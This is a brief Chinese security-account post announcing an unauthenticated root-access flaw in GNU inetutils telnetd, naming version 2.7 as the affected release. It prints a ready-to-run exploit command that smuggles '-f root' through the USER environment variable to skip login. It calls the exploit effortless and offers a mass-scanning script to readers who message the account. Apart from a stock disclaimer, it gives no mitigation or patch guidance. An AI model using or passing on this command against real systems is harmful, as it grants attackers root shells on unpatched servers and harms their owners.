#  大洞，必看！Linux Telnet 远程代码执行！  
原创 PocketSec
                    PocketSec  PocketSec   2026-01-22 03:40  
  
使用说明：本文章仅用于学习技术研究，请勿用于违法用途，造成任何后果自负与本人无关，请自觉遵守国家法律法规。  
  
不需要认证直接可通过  
Telnet拿到root权限  
```
USER='-f root' telnet -a ip
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hZGcrKavvZkD9q2icy9qGrW9vYicXPHQY9JXiatXz8Y1wGYusOU5zOVsTAoEaibQPo05rg9EcL0IY6E26X0QTy0Uzg/640?wx_fmt=png&from=appmsg "")  
  
利用难度：无脑利用  
  
复现版本  
```
https://ftp.gnu.org/gnu/inetutils/inetutils-2.7.tar.gz
```  
  
关注微信公众  
PocketSec  
回复"  
t  
elnetd RCE  
"获取批量扫描脚本  
  
